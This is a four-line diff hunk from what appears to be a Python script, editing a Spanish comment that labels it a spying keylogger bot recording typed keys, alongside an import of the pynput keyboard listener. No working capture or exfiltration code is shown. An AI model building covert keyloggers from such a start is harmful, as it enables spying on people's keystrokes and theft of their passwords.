@@ -1,4 +1,4 @@
-#Bot Keylogger espía
+#Bot Keylogger espía, registra teclas escritas
 
 from pynput.keyboard import Key, Listener
 
